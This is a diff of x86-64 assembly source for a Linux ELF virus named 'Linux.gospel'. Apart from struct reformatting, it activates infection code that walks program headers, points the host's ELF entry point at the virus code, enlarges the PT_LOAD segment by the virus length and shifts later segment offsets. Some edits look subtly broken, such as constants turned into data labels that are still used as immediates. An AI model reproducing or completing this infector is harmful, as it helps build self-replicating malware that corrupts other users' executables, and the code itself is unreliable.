@@ -1,5 +1,6 @@
 BITS 64
 
+
 ;*******************************************************************************
 ; ********************
 ; Linux.gospel
@@ -141,56 +142,55 @@ BITS 64
 ;  
 ;*******************************************************************************
 
-
-section .bss
+section	.bss
 	struc linuxdirent
-		.d_ino:			resq 1
-		.d_off:			resq 1
-		.d_reclen:		resb 2
-		.d_nameq:		resb 1
-		.d_type:		resb 1
+		.d_ino:			resq	1
+		.d_off:			resq	1
+		.d_reclen:		resb	2
+		.d_nameq:		resb	1
+		.d_type:		resb	1
 	endstruc
 	
 	struc filestat
-		.st_dev			resq 1	;ID of dev containing file
-		.st_ino			resq 1	;inode #
-		.st_mode		resd 1	;pn
-		.st_nlink		resd 1	;# of hard links
-		.st_uid			resd 1	;user id of owner
-		.st_gid			resd 1	;group Id of owner
-		.st_rdev		resq 1 	;dev ID 
-		.st_pad1		resq 1 	;padding 
-		.st_size		resd 1	;total size in bytes
-		.st_blksize		resq 1	; blocksize for fs i/o
-		.st_pad2		resd 1	;padding
-		.st_blocks		resq 1	;# of 512b blocks allocated
-		.st_atime		resq 1	;time of last file access
-		.st_mtime		resq 1	;time of last file mod
-		.st_ctime		resq 1	;time of last file status change
+		.st_dev			resq	1	;IDofdevcontainingfile
+		.st_ino			resq	1	;inode#
+		.st_mode		resd	1	;pn
+		.st_nlink		resd	1	;#ofhardlinks
+		.st_uid			resd	1	;useridofowner
+		.st_gid			resd	1	;groupIdofowner
+		.st_rdev		resq	1	;devID
+		.st_pad1		resq	1	;padding
+		.st_size		resd	1	;totalsizeinbytes
+		.st_blksize		resq	1	;blocksizeforfsi/o
+		.st_pad2		resd	1	;padding
+		.st_blocks		resq	1	;#of512bblocksallocated
+		.st_atime		resq	1	;timeoflastfileaccess
+		.st_mtime		resq	1	;timeoflastfilemod
+		.st_ctime		resq	1	;timeoflastfilestatuschange
 	endstruc
 
 	struc elf_ehdr
-		.e_ident		resd 1		; unsigned char
-		.ei_class		resb 1		; 
-		.ei_data		resb 1		; 
-		.ei_version		resb 1		; 
-		.ei_osabi		resb 1		; 
-		.ei_abiversion	resb 1		; 
-		.ei_padding		resb 6		; bytes 9-14
-		.ei_nident		resb 1		; size of ident array
-		.e_type			resb 2		; uint16_t, bytes 16-17
-		.e_machine		resb 2		; uint16_t, bytes 18-19
-		.e_version		resw 1		; uint32_t
-		.e_entry		resq 1		; ElfN_Addr
-        .e_phoff		resq 1		; ElfN_Off 
-        .e_shoff		resq 1		; ElfN_Off 
-        .e_flags		resw 1		; uint32_t 
-        .e_ehsize		resb 2		; uint16_t 
-        .e_phentsize	resb 2		; uint16_t 
-        .e_phnum		resb 2		; uint16_t 
-        .e_shentsize	resb 2		; uint16_t 
-        .e_shnum		resb 2		; uint16_t 
-        .e_shstrndx		resb 2		; uint16_t 
+		.e_ident		resd	1		;unsignedchar
+		.ei_class		resb	1		;
+		.ei_data		resb	1		;
+		.ei_version		resb	1		;
+		.ei_osabi		resb	1		;
+		.ei_abiversion	resb	1		;
+		.ei_padding		resb	6		;bytes9-14
+		.ei_nident		resb	1		;sizeofidentarray
+		.e_type			resw	1		;uint16_t,bytes16-17
+		.e_machine		resw	1		;uint16_t,bytes18-19
+		.e_version		resd	1		;uint32_t, bytes 20-23
+		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
+		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
+		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
+		.e_flags		resd	1		;uint32_t, bytes 48-51
+		.e_ehsize		resb	2		;uint16_t, bytes 52-53
+		.e_phentsize	resb	2		;uint16_t, bytes 54-55
+		.e_phnum		resb	2		;uint16_t, bytes 56-57
+		.e_shentsize	resb	2		;uint16_t, bytes 58-59
+		.e_shnum		resb	2		;uint16_t, bytes 60-61
+		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 	endstruc
 
 	struc elf_phdr
@@ -237,7 +237,7 @@ SYS_GETDENTS64	equ 0x4e
 SYS_CREAT		equ 0x55
 
 
-PAGESIZE equ 4096	
+PAGESIZE dd 4096	
 
 
 teststr db 'boo', 13,10,0
@@ -293,6 +293,8 @@ vxoffset: dq 0
 ventry equ $_start 
 
 fd:	dq 0
+
+
 ;fdlen equ $-fd
 ;framebuffer:
 ;	db `//dev//fb0`,0
@@ -335,7 +337,7 @@ ELFX8664		equ 0x3e
 DT_REG 			equ 0x8
 
 ;PHDR vals
-PT_LOAD 		equ 0x0100
+PT_LOAD 	dd 1
 
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
@@ -744,18 +746,18 @@ infect:
 ;
 ;	vx_offset = the offset to start of vx code after insertion into host program 
 ;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
-;
+;	r13 contains address of mmap'ed file
+;	r12 contains *offset* within mmap'ed file to PHdr
+;	we need to increment r12 on each iteration (where # of iterations == elf_ehdr.e_phnum)
 ;
 ;****************************************************************************************
 	xor rcx, rcx
-	mov word cx, [r13 + elf_ehdr.e_phnum]
-	mov rdx, [r13 + elf_ehdr.e_phentsize]
-
+	xor rdx, rdx
 	check_phdrs:
 		.phdr_loop:
 			;cmp rcx, 0
 			;jg .mod_subsequent_phdr		
-			cmp word [r12 + elf_phdr.p_type], PT_LOAD			
+			cmp dword [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				mov rdx, checkptloadpasslen
@@ -763,16 +765,16 @@ infect:
 				mov rdi, STDOUT
 				mov rax, SYS_WRITE
 				syscall
-	;		mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-	;		add r10, [r13 + r12 + elf_phdr.p_filesz]
-	;		add qword r10, [ventry]				;new entry point = evaddr + ventry
-	;		mov qword [evaddr], r10
-	;		mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
-	;		mov r10, [r12 + elf_phdr.p_offset] 
-	;		add r10, [r12 + elf_phdr.p_filesz]				
-	;		mov qword [vxoffset], r10
-	;		add qword [r12 + elf_phdr.p_filesz], vlen	
-	;		add qword [r12 + elf_phdr.p_memsz], vlen	
+				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+				add r10, [r13 + r12 + elf_phdr.p_filesz]
+				add qword r10, [ventry]				;new entry point = evaddr + ventry
+				mov qword [evaddr], r10
+				mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
+				mov r10, [r13 + r12 + elf_phdr.p_offset] 
+				add r10, [r12 + elf_phdr.p_filesz]				
+				mov qword [vxoffset], r10
+				add qword [r12 + elf_phdr.p_filesz], vlen	
+				add qword [r12 + elf_phdr.p_memsz], vlen	
 
 			.mod_subsequent_phdr:
 				mov rdx, checkptloadfaillen
@@ -780,20 +782,13 @@ infect:
 				mov rdi, STDOUT
 				mov rax, SYS_WRITE
 				syscall
-				;mov edi, dword [r12 + elf_phdr.p_offset]
-				;add edi, PAGESIZE
-				;mov dword [r12 + elf_phdr.p_offset], edi
+				add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 		.next_phdr:
-			dec cx 
-			;add r12w, dx 
-		;;	add r12d, dword [rax+ elf_ehdr.e_phentsize]
-			;cmp cx, word [r13 + elf_ehdr.e_phnum]
-			cmp cx, 0
+			inc dx 
+			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			cmp word dx, [r13 + elf_ehdr.e_phnum]
+			jl .phdr_loop
 			;jg check_shdrs
-			;jnz .phdr_loop			
-			;je frankenstein_elf
-			;add word r12w, [r13 + elf_ehdr.e_phentsize]
-
 	jmp frankenstein_elf
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
